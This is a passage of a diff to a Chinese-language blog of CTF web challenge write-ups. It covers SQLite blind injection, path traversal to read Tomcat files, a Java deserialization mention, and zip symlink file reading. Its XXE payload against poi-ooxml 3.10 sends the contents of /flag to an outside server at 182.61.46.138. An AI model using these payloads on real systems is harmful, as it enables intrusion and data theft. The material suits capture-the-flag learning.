+table<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"C"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"F"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span> <span class="token comment"># 'koala' → '6B6F616C61'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最终通过<a target="_blank" rel="noopener" href="https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/#Sqlite-Voting">脚本</a>拿到flag</p>
 <h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2><p>一个上传，上传之后可以下载，看到链接里面有文件名，尝试目录穿越拿web.xml文件<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210022204005.png"></p>
 <p>下载class（<code>../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</code>）进行反编译，得到源码，我们直接看上传的关键部分</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName))</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">		Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">		System.out.println(sheet.getFirstRowNum());</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">		System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;  </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"excel-"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"xlsx"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>fileExtName<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+		<span class="token class-name">Workbook</span> wb1 <span class="token operator">=</span> <span class="token class-name">WorkbookFactory</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token class-name">Sheet</span> sheet <span class="token operator">=</span> wb1<span class="token punctuation">.</span><span class="token function">getSheetAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sheet<span class="token punctuation">.</span><span class="token function">getFirstRowNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidFormatException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"poi-ooxml-3.10 has something wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>此处使用<code>poi-ooxml-3.10</code>来解析数据，这个版本有漏洞可导致XXE，CVE-2014-3529</p>
 <p>那么就直接利用，首先在自己服务器上放一个f.dtd</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://182.61.46.138?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;182.61.46.138?p&#x3D;%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>然后更改xlsx中的[Content_Types].xml文件，添加如下内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://182.61.46.138/f.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE convert [
+&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;182.61.46.138&#x2F;f.dtd&quot;&gt;
+%remote;%int;%send;
+]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>重新压缩上传即可接收flag</p>
 <h2 id="HXBCTF-2021-easywill"><a href="#HXBCTF-2021-easywill" class="headerlink" title="[HXBCTF 2021]easywill"></a>[HXBCTF 2021]easywill</h2><p>跟源码，后面再补</p>
@@ -481,10 +584,107 @@
 <p>然后使用CVE-2019-14439的反序列化链打进去，用JNDI-Injection-Exploit来生成payload</p>
 <h2 id="HCTF-2018-Hideandseek"><a href="#HCTF-2018-Hideandseek" class="headerlink" title="[HCTF 2018]Hideandseek"></a>[HCTF 2018]Hideandseek</h2><p>登录，任意输入除admin之外的用户名和密码，然后就让上传zip，第一件事就想到软连接，确实可以<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210102353287.png"></p>
 <p>那读一下源码吧，盲猜是个python，proc读试试，<del>事实证明直接莽是没什么卵子用的</del>，还是乖乖读了environ，然后/app/main.py读源码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>session<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> request<span class="token punctuation">,</span>Response
+<span class="token keyword">import</span> uuid
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> flag
+<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename
+<span class="token keyword">import</span> os
+random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'./uploads'</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">1024</span>
+ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'zip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> \
+           filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    error <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>error <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> forbidden<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> user<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>flag<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
+    password<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> username <span class="token operator">!=</span> <span class="token string">''</span> <span class="token keyword">and</span> password <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>error<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'the_file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'the_file'</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token builtin">file</span> <span class="token keyword">and</span> allowed_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
+        file_save_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">'This file already exists'</span>
+        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'This file is not a zipfile'</span>
+
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        extract_path <span class="token operator">=</span> file_save_path <span class="token operator">+</span> <span class="token string">'_'</span>
+        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'unzip -n '</span> <span class="token operator">+</span> file_save_path <span class="token operator">+</span> <span class="token string">' -d '</span><span class="token operator">+</span> extract_path<span class="token punctuation">)</span>
+        read_obj <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat '</span> <span class="token operator">+</span> extract_path <span class="token operator">+</span> <span class="token string">'/*'</span><span class="token punctuation">)</span>
+        <span class="token builtin">file</span> <span class="token operator">=</span> read_obj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        read_obj<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm -rf '</span> <span class="token operator">+</span> extract_path<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token boolean">None</span>
+
+    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">file</span> <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'aGN0Zg=='</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token comment">#app.run(debug=True)</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">10008</span><span class="token punctuation">)</span>
